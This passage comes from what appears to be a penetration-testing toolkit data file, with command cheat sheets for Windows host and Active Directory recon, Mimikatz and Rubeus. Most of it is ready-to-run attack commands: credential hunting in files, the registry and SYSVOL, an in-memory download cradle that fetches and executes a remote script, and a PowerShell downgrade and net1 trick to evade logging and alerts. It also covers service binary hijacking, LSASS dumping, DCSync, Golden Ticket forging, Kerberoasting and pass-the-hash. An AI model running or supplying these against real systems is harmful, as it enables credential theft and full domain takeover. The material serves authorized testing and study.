            "cmd": "findstr /spin \"password\" *.txt *.ini *.config *.xml 2>nul"
          }
        ],
        "sections": [
          {
            "title": "System & session context",
            "type": "table",
            "columns": [
              "Command",
              "What it tells you"
            ],
            "rows": [
              [
                "whoami",
                "The current user as DOMAIN\\user"
              ],
              [
                "whoami /user",
                "Username plus the account SID"
              ],
              [
                "whoami /fqdn",
                "The fully-qualified distinguished name (domain-joined only)"
              ],
              [
                "hostname",
                "The machine name"
              ],
              [
                "systeminfo",
                "OS version, build, hotfixes, domain, boot time — pipe to findstr for patches"
              ],
              [
                "ver",
                "Just the Windows version string"
              ],
              [
                "wmic qfe get HotFixID,InstalledOn",
                "Installed patches — compare against known privesc CVEs"
              ],
              [
                "set",
                "All environment variables (PATH, USERDOMAIN, LOGONSERVER, temp paths, sometimes secrets)"
              ],
              [
                "echo %USERDOMAIN% / %LOGONSERVER%",
                "Current domain and the DC that authenticated this session"
              ],
              [
                "query user  /  quser",
                "Other interactive/RDP sessions on this host"
              ],
              [
                "query session  /  qwinsta",
                "Session IDs and states — useful before token theft or RDP hijack"
              ]
            ]
          },
          {
            "title": "Privileges, groups & tokens",
            "type": "table",
            "columns": [
              "Command",
              "What it does"
            ],
            "rows": [
              [
                "whoami /priv",
                "List token privileges and whether each is Enabled — the single most important privesc check (look for SeImpersonate, SeBackup, SeRestore, SeDebug, SeManageVolume, SeLoadDriver, SeTakeOwnership)"
              ],
              [
                "whoami /groups",
                "Group memberships and the token's integrity level (Medium = unelevated, High = elevated admin)"
              ],
              [
                "whoami /all",
                "Everything: user SID, groups, and privileges in one dump"
              ],
              [
                "net localgroup Administrators",
                "Who is a local admin on this box"
              ],
              [
                "net localgroup \"Remote Desktop Users\"",
                "Who can RDP in"
              ],
              [
                "klist",
                "Kerberos tickets cached in the current session (TGT + service tickets)"
              ]
            ]
          },
          {
            "title": "File permissions & ownership",
            "type": "table",
            "columns": [
              "Command",
              "What it does"
            ],
            "rows": [
              [
                "icacls \"<path>\"",
                "Show the DACL — who has what (F=full, M=modify, RX=read+exec, W=write). Read this first to spot writable service binaries/dirs"
              ],
              [
                "icacls \"<path>\" /grant <user>:(F)",
                "STATE-CHANGING — grant a user full control (needs write-DACL/ownership)"
              ],
              [
                "icacls \"<path>\" /grant:r <user>:(M)",
                "STATE-CHANGING — replace (/:r) this user's ACE with Modify"
              ],
              [
                "icacls \"<path>\" /remove <user>",
                "STATE-CHANGING — strip a user's ACEs"
              ],
              [
                "icacls \"<dir>\" /grant <user>:(OI)(CI)F /T",
                "STATE-CHANGING — grant full, inheritable to files (OI)/subdirs (CI), applied recursively (/T)"
              ],
              [
                "icacls \"<path>\" /setowner <user>",
                "STATE-CHANGING — set the owner (needs SeTakeOwnership or ownership)"
              ],
              [
                "icacls \"<dir>\" /save acl.txt /T  …  /restore acl.txt",
                "Back up and restore DACLs across a tree"
              ],
              [
                "takeown /f \"<path>\" /r /d y",
                "STATE-CHANGING — seize ownership of a file/tree so you can then re-ACL it"
              ],
              [
                "attrib -h -r -s \"<path>\"",
                "STATE-CHANGING — clear hidden/read-only/system attributes to reveal or edit a file"
              ],
              [
                "dir /q /a \"<path>\"",
                "List with owner (/q) including hidden/system (/a) entries"
              ]
            ]
          },
          {
            "title": "Running as another identity & stored creds",
            "type": "table",
            "columns": [
              "Command",
              "What it does"
            ],
            "rows": [
              [
                "runas /user:DOMAIN\\user cmd",
                "Start a process as another user — prompts interactively for the password"
              ],
              [
                "runas /user:DOMAIN\\user /savecred \"cmd\"",
                "Reuse a previously saved password (also a privesc win if an admin's cred is already stored — check cmdkey /list)"
              ],
              [
                "runas /netonly /user:DOMAIN\\user cmd",
                "Use the creds only for NETWORK auth — not validated locally, so it works from a non-domain host with just domain creds (great for AD tooling)"
              ],
              [
                "cmdkey /list",
                "List saved credentials in the vault — /savecred runas or RDP creds you can reuse"
              ],
              [
                "cmdkey /add:<host> /user:<u> /pass:<p>",
                "STATE-CHANGING — store a credential for a target host"
              ],
              [
                "cmdkey /delete:<host>",
                "STATE-CHANGING — remove a stored credential"
              ],
              [
                "net use \\\\<host>\\IPC$ /user:DOMAIN\\user <pass>",
                "Authenticate an SMB session to a host (test creds, mount shares)"
              ],
              [
                "net use \\\\<host>\\C$  /delete",
                "Map / tear down an admin share"
              ]
            ]
          },
          {
            "title": "Local users & groups",
            "type": "table",
            "columns": [
              "Command",
              "What it does"
            ],
            "rows": [
              [
                "net user",
                "List local user accounts"
              ],
              [
                "net user <name>",
                "Detail one account — last logon, group memberships, password flags"
              ],
              [
                "net user <name> <pass> /add",
                "STATE-CHANGING — create a local user"
              ],
              [
                "net localgroup",
                "List local groups"
              ],
              [
                "net localgroup Administrators <user> /add",
                "STATE-CHANGING — add a user to local admins"
              ],
              [
                "net accounts",
                "Local password/lockout policy (min length, lockout threshold)"
              ]
            ]
          },
          {
            "title": "Domain & Active Directory recon",
            "type": "table",
            "columns": [
              "Command",
              "What it does"
            ],
            "rows": [
              [
                "net user <name> /domain",
                "Detail a domain account (groups, logon restrictions) — queries the DC"
              ],
              [
                "net group /domain",
                "List all domain groups"
              ],
              [
                "net group \"Domain Admins\" /domain",
                "Members of Domain Admins (swap for Enterprise Admins, etc.)"
              ],
              [
                "net accounts /domain",
                "Domain password & lockout policy — gate your spraying by this"
              ],
              [
                "net view /domain",
                "Browse domains visible on the network"
              ],
              [
                "net view \\\\<host>",
                "Enumerate shares on a host"
              ],
              [
                "nltest /dclist:<domain>",
                "List the domain controllers for a domain"
              ],
              [
                "nltest /dsgetdc:<domain>",
                "Locate and describe the nearest DC (site, flags, address)"
              ],
              [
                "nltest /domain_trusts",
                "Enumerate trusted domains — map the forest/trust landscape"
              ],
              [
                "nltest /trusted_domains",
                "Trust relationships of the current domain"
              ],
              [
                "dsquery user -limit 0",
                "List all domain users (present when the AD DS/RSAT tools are installed, e.g. on a DC/admin host)"
              ],
              [
                "dsquery group / dsquery computer",
                "Enumerate domain groups / computers"
              ],
              [
                "setspn -L <account>",
                "Service Principal Names for an account"
              ],
              [
                "setspn -T <domain> -Q */*",
                "Find every SPN in the domain — the target list for Kerberoasting"
              ],
              [
                "gpresult /r",
                "Applied Group Policy for the current user/computer (summary)"
              ],
              [
                "gpresult /h gp.html",
                "Full applied-GPO report as HTML — read for mapped drives, scripts, restrictions"
              ],
              [
                "klist tgt / klist",
                "Inspect cached Kerberos tickets (encryption type, expiry)"
              ]
            ]
          },
          {
            "title": "Living off the land: PowerShell recon & its logging",
            "type": "commands",
            "commands": [
              {
                "label": "Recon cmdlets",
                "cmd": "Get-Module                      # loaded modules (is ActiveDirectory there?)\nGet-ExecutionPolicy -List       # policy per scope\nSet-ExecutionPolicy Bypass -Scope Process   # bypass for THIS process only\nGet-ChildItem Env: | ft Key,Value           # env: paths, USERDOMAIN, LOGONSERVER"
              },
              {
                "label": "Loot the user's PowerShell history",
                "cmd": "Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n# frequently holds passwords, share paths and script locations"
              },
              {
                "label": "In-memory download cradle (no file on disk)",
                "cmd": "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://<ip>/x.ps1')\""
              },
              {
                "label": "Downgrade to PowerShell v2 (evade script-block logging)",
                "cmd": "# Script Block (4104) + Module (4103) logging need PS 3.0+; v2 is not logged.\npowershell.exe -version 2\nGet-Host        # 'Version : 2.0' confirms the downgrade\n# BUT launching v2 is itself logged (engine-start event 400, HostVersion 2.0),\n# so it is a tell, not true invisibility."
              }
            ]
          },
          {
            "title": "Checking host defenses & sessions",
            "type": "table",
            "columns": [
              "Command",
              "What it shows"
            ],
            "rows": [
              [
                "netsh advfirewall show allprofiles",
                "Firewall state per profile (Domain/Private/Public) and its logging config"
              ],
              [
                "sc query windefend",
                "Whether Windows Defender's service is RUNNING (from cmd.exe)"
              ],
              [
                "Get-MpComputerStatus",
                "Defender detail: real-time / behaviour / tamper protection, signature age, scan state"
              ],
              [
                "Get-MpPreference | ft ExclusionPath,ExclusionProcess",
                "Defender exclusions — unmonitored paths/processes to stage from"
              ],
              [
                "qwinsta  /  query user",
                "Other logged-on or RDP sessions — the 'am I alone?' check before acting"
              ],
              [
                "net1 ...  (instead of net ...)",
                "net1.exe runs the same functions without the literal 'net ' string some tools alert on"
              ]
            ]
          },
          {
            "title": "dsquery LDAP filters",
            "type": "commands",
            "commands": [
              {
                "label": "Objects & wildcard search",
                "cmd": "dsquery user                 # all user DNs\ndsquery computer             # all computer DNs\ndsquery * \"CN=Users,DC=corp,DC=local\"   # every object under an OU/container"
              },
              {
                "label": "Users with PASSWD_NOTREQD (UAC bit 32)",
                "cmd": "dsquery * -filter \"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl"
              },
              {
                "label": "Find Domain Controllers (UAC bit 8192)",
                "cmd": "dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName"
              },
              {
                "label": "One-shot domain + trust map via WMI (no dsquery)",
                "cmd": "wmic ntdomain get Caption,DomainName,DnsForestName,DomainControllerAddress\n# lists the domain, child domains and trusted/external forests"
              }
            ]
          },
          {
            "title": "LDAP OID rules & common UAC bitmasks",
            "type": "table",
            "columns": [
              "Filter token",
              "Meaning"
            ],
            "rows": [
              [
                "...803:=<n>  (1.2.840.113556.1.4.803)",
                "Bitwise AND — the value must match this bit EXACTLY (the usual single-attribute rule)"
              ],
              [
                "...804:=<n>  (1.2.840.113556.1.4.804)",
                "Bitwise OR — match if ANY bit in the value matches"
              ],
              [
                "...1941:=<dn>  (1.2.840.113556.1.4.1941)",
                "Match across chained DN ownership/membership (recursive)"
              ],
              [
                "&  |  !",
                "Logical AND / OR / NOT, e.g. (&(objectClass=user)(!userAccountControl:...803:=64))"
              ],
              [
                "UAC 2 / 32 / 64",
                "ACCOUNTDISABLE / PASSWD_NOTREQD / PASSWD_CANT_CHANGE"
              ],
              [
                "UAC 8192 / 524288",
                "SERVER_TRUST_ACCOUNT (a Domain Controller) / TRUSTED_FOR_DELEGATION (unconstrained)"
              ]
            ]
          },
          {
            "title": "Services, processes & scheduled tasks",
            "type": "table",
            "columns": [
              "Command",
              "What it does"
            ],
            "rows": [
              [
                "sc query state= all",
                "List all services and their state (note the space after state=)"
              ],
              [
                "sc qc <service>",
                "Show a service's config — binary path (BINARY_PATH_NAME) and the account it runs as"
              ],
              [
                "sc config <service> binPath= \"C:\\evil.exe\"",
                "STATE-CHANGING — repoint a weak-ACL service's binary (classic privesc; space after binPath=)"
              ],
              [
                "sc stop <service>  /  sc start <service>",
                "STATE-CHANGING — restart a service to trigger your new binPath"
              ],
              [
                "tasklist /v",
                "Running processes with the owning user — spot SYSTEM/admin processes"
              ],
              [
                "tasklist /svc",
                "Map processes to the services hosted in them"
              ],
              [
                "taskkill /PID <pid> /F",
                "STATE-CHANGING — force-kill a process"
              ],
              [
                "schtasks /query /fo LIST /v",
                "All scheduled tasks, verbose — look for SYSTEM tasks running a writable script/binary"
              ],
              [
                "schtasks /create /tn <n> /tr \"<cmd>\" /sc onlogon /ru SYSTEM",
                "STATE-CHANGING — persistence via a task (requires rights)"
              ],
              [
                "wmic service get Name,PathName,StartName",
                "Service binary paths + run-as account in one table (unquoted-path / weak-ACL hunting)"
              ],
              [
                "wmic process list brief",
                "Processes with PID/parent — quick triage"
              ]
            ]
          },
          {
            "title": "Networking",
            "type": "table",
            "columns": [
              "Command",
              "What it does"
            ],
            "rows": [
              [
                "ipconfig /all",
                "Interfaces, IPs, DNS servers (often the DC), domain suffix, MAC"
              ],
              [
                "arp -a",
                "ARP cache — hosts this box has recently talked to on-LAN"
              ],
              [
                "route print",
                "Routing table — reveals other reachable subnets to pivot toward"
              ],
              [
                "netstat -ano",
                "All connections/listeners with owning PID — map internal services and C2"
              ],
              [
                "netstat -anob",
                "Same, plus the owning program name (needs admin)"
              ],
              [
                "nbtstat -A <ip>",
                "NetBIOS name table for a remote host (names, MAC)"
              ],
              [
                "getmac",
                "MAC addresses of local adapters"
              ],
              [
                "netsh advfirewall show allprofiles",
                "Firewall state per profile"
              ],
              [
                "netsh advfirewall set allprofiles state off",
                "STATE-CHANGING — disable the Windows firewall (loud; admin)"
              ],
              [
                "netsh wlan show profiles",
                "Saved Wi-Fi profiles"
              ],
              [
                "netsh wlan show profile name=\"<ssid>\" key=clear",
                "Reveal a saved Wi-Fi key in cleartext"
              ]
            ]
          },
          {
            "title": "Hunting stored secrets",
            "type": "commands",
            "commands": [
              {
                "label": "Search files for passwords",
                "cmd": "findstr /spin \"password\" *.txt *.ini *.config *.xml 2>nul\n# /s recurse, /p skip binary, /i case-insensitive, /n line numbers"
              },
              {
                "label": "Search the registry for passwords",
                "cmd": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s"
              },
              {
                "label": "Classic credential locations",
                "cmd": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"   # autologon DefaultPassword\ncmdkey /list                                                        # saved creds\ndir /s /b %USERPROFILE%\\*unattend* %USERPROFILE%\\*.kdbx 2>nul       # unattend.xml / KeePass"
              },
              {
                "label": "Group Policy Preferences cpassword (reversible)",
                "cmd": "findstr /S /I cpassword \\\\<domain>\\sysvol\\<domain>\\policies\\*.xml"
              }
            ]
          },
          {
            "title": "Typical first-5-minutes workflow",
            "type": "commands",
            "commands": [
              {
                "label": "Orient (who/where/what can I do)",
                "cmd": "whoami /all\nhostname & ver\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Domain\"\nnet localgroup Administrators"
              },
              {
                "label": "Look for a privesc primitive",
                "cmd": "whoami /priv\nwmic service get Name,PathName,StartName | findstr /I /V \"C:\\Windows\"\nschtasks /query /fo LIST /v | findstr /I \"TaskName Run As User SYSTEM\""
              },
              {
                "label": "Map the network & domain",
                "cmd": "ipconfig /all\nroute print\nnltest /dclist:<domain>\nnltest /domain_trusts"
              },
              {
                "label": "Sweep for easy creds",
                "cmd": "cmdkey /list\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\nfindstr /spin \"password\" *.txt *.ini *.config 2>nul"
              }
            ]
          },
          {
            "title": "Notes & OPSEC",
            "type": "notes",
            "items": [
              "These are the quiet first move: signed, present on every host, and rarely alerted on individually — but a burst of them in seconds is itself a behavioural signal, so pace your enumeration and don't shotgun every command at once.",
              "whoami /priv is the highest-value single command: an Enabled SeImpersonate/SeAssignPrimaryToken, SeBackup/SeRestore, SeDebug, SeManageVolume or SeLoadDriver is a direct path to SYSTEM — see the token-abuse theory page.",
              "runas /netonly is the trick for using domain creds from an unjoined host or a different user context: it never validates the password locally, so a wrong password still spawns a shell that fails only when it hits the network.",
              "icacls output is the map for the 'writable + privileged' privesc pattern — a service binary, scheduled-task script, or DLL directory writable by your user is the overlap you're looking for.",
              "sc config, icacls /grant, schtasks /create, net user /add and netsh firewall changes modify the host — they are noisy, often logged, and should be deliberate, cleaned up, and within scope.",
              "wmic is deprecated and absent on the newest builds; prefer sc, PowerShell Get-CimInstance, or the Get-* cmdlets where wmic is missing.",
              "Living off the land = native tools only — it beats uploading tooling when a host has no internet, runs EDR, or baselines network traffic: signed built-ins blend in and pull nothing across the wire. Prefer one systeminfo over five host-recon commands to cut log volume.",
              "net1.exe is an alias for net.exe: some monitoring keys on the literal 'net ' string, so net1 group \"Domain Admins\" /domain runs the same query more quietly.",
              "Downgrading to PowerShell v2 disables Script Block (4104) and Module (4103) logging, but the downgrade is itself logged (engine-start event 400, HostVersion 2.0) — a tell, not invisibility (see the PowerShell-logging theory page).",
              "arp -a and route print reveal other subnets the host already talks to — the quiet way to spot pivot targets without scanning.",
              "net.exe and dsquery are commonly watched by EDR; space out these queries and expect alerts in heavily-monitored environments.",
              "Confirm written authorization before enumerating or changing anything on a host you don't own."
            ]
          },
          {
            "title": "References",
            "type": "references",
            "items": [
              {
                "label": "Microsoft — Windows Commands reference",
                "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands"
              },
              {
                "label": "Microsoft — icacls",
                "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls"
              },
              {
                "label": "Theory — Windows Local Privilege Escalation",
                "url": "theory/2026-10-15-windows-local-privilege-escalation.html"
              },
              {
                "label": "Theory — Windows Token Abuse & Potato Attacks",
                "url": "theory/2026-10-09-windows-token-potato.html"
              },
              {
                "label": "Theory — Windows Access Tokens & UAC",
                "url": "theory/2026-08-18-windows-tokens-uac.html"
              },
              {
                "label": "Toolkit — Mimikatz (credential extraction)",
                "url": "tool-detail.html?tool=mimikatz"
              },
              {
                "label": "Theory — LDAP and the AD Database (filters & OIDs)",
                "url": "theory/2026-08-18-ldap.html"
              },
              {
                "label": "Theory — Windows Telemetry & PowerShell Logging",
                "url": "theory/2026-09-23-windows-telemetry-logging.html"
              },
              {
                "label": "Theory — BloodHound & AD Enumeration",
                "url": "theory/2026-10-09-bloodhound-ad-enumeration.html"
              },
              {
                "label": "Map — Windows Privilege Escalation",
                "url": "windows-privesc-map.html#foothold"
              }
            ]
          }
        ]
      },
      {
        id: "mimikatz",
        name: "Mimikatz",
        url: "https://github.com/gentilkiwi/mimikatz",
        description: "Windows credential extraction — LSASS dumping, Kerberos tickets, DPAPI, and more.",
        brief: "Mimikatz reads credential material straight out of Windows memory and secret stores: plaintext/hash/Kerberos material from LSASS, tickets from the Kerberos cache, DPAPI-protected secrets, cached domain credentials, and more. It's also how Golden and Silver tickets get forged once a krbtgt or service-account hash is in hand.\n\nIt is one of the most heavily signatured tools that exists — assume default Defender/EDR flags the binary on sight. Running it live, on disk, unmodified is rarely viable outside a lab; in-memory execution (Cobalt Strike execute-assembly, PowerShell reflection, SafetyKatz-style forks) or offline analysis of a dumped LSASS process is the realistic path on a real engagement.",
        quickReference: [
          { label: "Required first command, every session", cmd: "privilege::debug" },
          { label: "Dump all logon credentials in memory", cmd: "sekurlsa::logonpasswords" },
          { label: "Dump an offline LSASS minidump instead of live memory", cmd: "sekurlsa::minidump lsass.dmp" },
          { label: "DCSync a target account (needs Replicating Directory Changes rights)", cmd: "lsadump::dcsync /user:corp\\krbtgt" },
          { label: "Forge and inject a Golden Ticket", cmd: "kerberos::golden /user:administrator /domain:corp.local /sid:<domain_sid> /krbtgt:<hash> /ptt" }
        ],
        sections: [
          {
            title: "Setup & Requirements",
            type: "table",
            columns: ["Command / Concept", "Description"],
            rows: [
              ["privilege::debug", "Elevates to SeDebugPrivilege — required before touching LSASS memory, run this first in every session"],
              ["token::elevate", "Steal a SYSTEM token when running as local admin but not already SYSTEM"],
              ["Architecture match", "The mimikatz.exe build (x86/x64) must match the target process's architecture, not just the OS"],
              ["Credential Guard", "When enabled, blocks most sekurlsa:: reads even with debug privilege and local admin — check for it before assuming a dump will work"],
              ["AV / EDR", "Assume the binary is signatured; use in-memory loaders (execute-assembly, PowerShell reflection) or a renamed/obfuscated fork rather than dropping mimikatz.exe to disk"]
            ]
          },
          {
            title: "Credential Dumping",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["sekurlsa::logonpasswords", "Dump all currently logged-on credentials — plaintext where WDigest/etc. permit it, NTLM hash otherwise"],
              ["sekurlsa::minidump <file>", "Load an offline LSASS minidump (from procdump/Task Manager) instead of reading live memory — much quieter"],
              ["sekurlsa::wdigest", "WDigest-cached plaintext credentials specifically (disabled by default since Win8.1/2012R2, but worth checking)"],
              ["sekurlsa::msv", "NTLM hashes only, no plaintext attempt"],
              ["sekurlsa::tspkg", "Credentials cached by the TSPKG provider (RDP/Terminal Services sessions)"],
              ["sekurlsa::ssp", "Credentials cached by the SSP provider"],
              ["lsadump::sam", "Local SAM database — local account hashes"],
              ["lsadump::secrets", "LSA secrets — service account passwords, auto-logon credentials, etc."],
              ["lsadump::cache", "Cached domain logon credentials (MSCache/DCC2) — crackable but not directly usable for pass-the-hash"]
            ]
          },
          {
            title: "Kerberos Ticket Operations",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["kerberos::list", "List Kerberos tickets currently in memory for the session"],
              ["sekurlsa::tickets /export", "Dump every ticket in memory to .kirbi files, from any logged-on session"],
              ["kerberos::ptt <ticket.kirbi>", "Pass-the-ticket — inject a ticket into the current logon session"],
              ["kerberos::purge", "Clear the current session's ticket cache before injecting a new one"]
            ]
          },
          {
            title: "Golden & Silver Tickets",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["kerberos::golden /user:<u> /domain:<d> /sid:<sid> /krbtgt:<hash> /ptt", "Forge a Golden Ticket (full domain-wide TGT) using the krbtgt account's hash — grants access as any user, to anything"],
              ["/aes256:<key> instead of /krbtgt:<ntlm>", "Forge using the krbtgt's AES256 key instead of RC4 — quieter in AES-enforced environments"],
              ["kerberos::golden /user:<u> /domain:<d> /sid:<sid> /target:<spn_host> /service:<svc> /rc4:<svc_hash> /ptt", "Forge a Silver Ticket — scoped to one specific service, using that service account's hash instead of krbtgt's"],
              ["/ptt vs /ticket:<file>", "/ptt injects directly into the current session; /ticket writes a .kirbi to use later or from another host"]
            ]
          },
          {
            title: "DCSync",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["lsadump::dcsync /user:<domain>\\krbtgt", "Pull the krbtgt hash remotely via the directory replication protocol — the usual first move toward a Golden Ticket"],
              ["lsadump::dcsync /user:<domain>\\<user>", "Pull any other account's hash the same way"],
              ["Requirement", "Needs Replicating Directory Changes + Replicating Directory Changes All rights — Domain Admins/Enterprise Admins have it by default, but so can any account this has been delegated to"]
            ]
          },
          {
            title: "Other Credential Sources",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["dpapi::masterkey /in:<file> /sid:<sid> /password:<pass>", "Decrypt a DPAPI masterkey using the user's password or domain backup key"],
              ["dpapi::cred /in:<file> /masterkey:<key>", "Decrypt a DPAPI-protected credential blob once the masterkey is known"],
              ["vault::cred", "Dump Windows Credential Vault entries (saved RDP/web credentials)"],
              ["crypto::capi / crypto::cng", "Patch CryptoAPI/CNG to allow exporting normally non-exportable private keys"]
            ]
          },
          {
            title: "Pass-the-Hash / Pass-the-Ticket",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe", "Spawn a new process under a forged logon session using just an NTLM hash — no plaintext password needed"],
              ["kerberos::ptt <ticket.kirbi>", "Same idea for Kerberos — inject a ticket (legitimate, golden, or silver) into the current session"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard live credential dump", cmd: "privilege::debug\nsekurlsa::logonpasswords" },
              { label: "Safer offline dump-and-parse (avoids running mimikatz live)", cmd: "# on target, via a minidump tool:\nrundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass_pid> C:\\lsass.dmp full\n# transfer lsass.dmp off-host, then locally:\nmimikatz.exe\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords" },
              { label: "DCSync → Golden Ticket → domain-wide access", cmd: "privilege::debug\nlsadump::dcsync /user:corp\\krbtgt\n# using the recovered hash:\nkerberos::purge\nkerberos::golden /user:administrator /domain:corp.local /sid:<domain_sid> /krbtgt:<hash> /ptt\n# current session now holds a domain-wide forged TGT" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Run privilege::debug first, every time — most other commands silently fail without it.",
              "Prefer offline minidump analysis or in-memory execution over dropping mimikatz.exe to disk — it's one of the most heavily signatured tools in the industry.",
              "Credential Guard (on by default on many modern builds) blocks most live sekurlsa:: reads even as SYSTEM — check for it before spending time troubleshooting a dump that will never work.",
              "A Golden Ticket built from a stale krbtgt hash still works until the krbtgt password is rotated (twice, with the standard AD guidance) — rotating krbtgt is the actual remediation, not just resetting user passwords.",
              "These techniques directly forge or extract domain identities — confirm written authorization before running any of them outside a lab."
            ]
          }
        ]
      },
      {
        id: "rubeus",
        name: "Rubeus",
        url: "https://github.com/GhostPack/Rubeus",
        description: "Kerberos abuse toolkit — roasting, ticket requests, delegation abuse, and ticket forging.",
        brief: "Rubeus is the modern, actively maintained Kerberos attack tool from the GhostPack suite — a single .NET binary that covers almost every practical Kerberos abuse technique: Kerberoasting, ASREPRoasting, ticket requests and injection, S4U/delegation abuse, overpass-the-hash, and Golden/Silver ticket forging. It runs standalone or in-memory via execute-assembly, and is generally the more opsec-flexible choice over ad-hoc PowerShell/Impacket scripting when you're already on a Windows host.",
        quickReference: [
          { label: "Kerberoast every roastable account", cmd: "Rubeus.exe kerberoast /outfile:hashes.txt" },
          { label: "ASREPRoast every pre-auth-disabled account", cmd: "Rubeus.exe asreproast /outfile:hashes.txt" },
          { label: "Request a TGT from creds", cmd: "Rubeus.exe asktgt /user:<user> /password:<pass> /domain:<domain> /ptt" },
          { label: "Pass-the-ticket", cmd: "Rubeus.exe ptt /ticket:<base64_or_file>" },
          { label: "S4U2Proxy delegation abuse, straight to a usable ticket", cmd: "Rubeus.exe s4u /user:<svc>$ /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /ptt" }
        ],
        sections: [
          {
            title: "Ticket Requests",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["asktgt /user:<u> /password:<p> /domain:<d> /ptt", "Request a TGT using a plaintext password and inject it into the current session"],
              ["asktgt /user:<u> /rc4:<hash> /domain:<d> /ptt", "Same, but via NTLM hash (\"overpass-the-hash\") instead of a password"],
              ["asktgt /user:<u> /aes256:<key> /domain:<d> /ptt", "Same, via the account's AES256 key — quieter in AES-enforced environments than falling back to RC4"],
              ["asktgs /ticket:<tgt> /service:<spn> /ptt", "Exchange a TGT for a service ticket (TGS) against a specific SPN"],
              ["renew /ticket:<file> /ptt", "Renew a renewable ticket that's approaching expiry"],
              ["harvest /interval:<sec>", "Continuously monitor and dump newly created TGTs from memory as they appear"],
              ["triage", "List every ticket currently in memory across all logon sessions on the host — a quick win-scan for interesting cached TGTs"]
            ]
          },
          {
            title: "Kerberoasting",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["kerberoast /outfile:hashes.txt", "Request service tickets for every account with an SPN and dump crackable hashes to file"],
              ["/user:<target>", "Scope to a single target account instead of every roastable account in the domain"],
              ["/stats", "List roastable accounts and their encryption support without actually requesting tickets"],
              ["/rc4opsec", "Only roast accounts that support RC4, skipping ones that would otherwise get force-downgraded — avoids an encryption-downgrade detection signal"],
              ["/aes", "Prefer AES-encrypted tickets where supported — slower to crack but quieter in AES-enforced environments"],
              ["/tgtdeleg", "Kerberoast without needing direct account credentials, by abusing TGT delegation — useful from an unprivileged context"]
            ]
          },
          {
            title: "ASREPRoasting",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["asreproast /outfile:hashes.txt", "Request AS-REP for every account with Kerberos pre-authentication disabled and dump crackable hashes"],
              ["/user:<target>", "Scope to one specific account known to have pre-auth disabled"],
              ["No credentials required", "Unlike Kerberoasting, this technique needs no valid domain credentials at all — just network access to a DC"]
            ]
          },
          {
            title: "Ticket Manipulation",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["ptt /ticket:<file_or_base64>", "Inject a ticket into the current logon session"],
              ["purge", "Clear all tickets from the current session before injecting a new one"],
              ["describe /ticket:<file>", "Parse and print the contents of a .kirbi file without injecting it"],
              ["dump", "Dump every ticket currently held by the current session"],
              ["klist", "List tickets for the current session (like the built-in klist.exe, but Rubeus-native)"]
            ]
          },
          {
            title: "Delegation Abuse (S4U)",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["s4u /user:<svc>$ /rc4:<hash> /impersonateuser:<target> /msdsspn:<spn> /ptt", "S4U2Self + S4U2Proxy chain — impersonate any user against a service the controlled account has constrained/RBCD delegation to"],
              ["/altservice:<spn>", "Request the resulting ticket for a different SPN than the one configured — works when the target has multiple SPNs registered"],
              ["monitor /interval:<sec> /filteruser:<account>", "Watch for a specific account's TGT to land in memory — the standard way to actually capture a session on a host with unconstrained delegation"],
              ["Typical RBCD pairing", "Create/control a computer account (via bloodyAD or StandIn) → set msDS-AllowedToActOnBehalfOfOtherIdentity → s4u here to get a ticket as anyone"]
            ]
          },
          {
            title: "Overpass-the-Hash / Pass-the-Key",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["asktgt /user:<u> /rc4:<hash> /ptt", "Turn an NTLM hash into a full Kerberos TGT — \"overpass-the-hash\""],
              ["/opsec", "Request the ticket in a way that more closely matches normal Windows ticket-request behavior, reducing detection signal"],
              ["createnetonly /program:cmd.exe", "Spawn a sacrificial logon session (like runas /netonly) to inject a ticket into, instead of touching the current one"]
            ]
          },
          {
            title: "Golden / Silver Tickets",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["golden /rc4:<krbtgt_hash> /sid:<sid> /user:<u> /domain:<d> /ptt", "Forge a Golden Ticket from a compromised krbtgt hash"],
              ["silver /service:<spn> /rc4:<svc_hash> /sid:<sid> /user:<u> /domain:<d> /ptt", "Forge a Silver Ticket scoped to one service, from that service account's hash"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Kerberoast → crack → PtH/overpass-the-hash", cmd: "Rubeus.exe kerberoast /outfile:hashes.txt\nhashcat -m 13100 hashes.txt rockyou.txt\n# once cracked, use the plaintext directly or:\nRubeus.exe asktgt /user:svc_sql /password:<cracked_pass> /domain:corp.local /ptt" },
              { label: "Opsec-safe overpass-the-hash into a sacrificial session", cmd: "Rubeus.exe createnetonly /program:cmd.exe\n# in the new process, from the same or another Rubeus instance targeting that PID:\nRubeus.exe asktgt /user:administrator /aes256:<key> /domain:corp.local /ptt /opsec" },
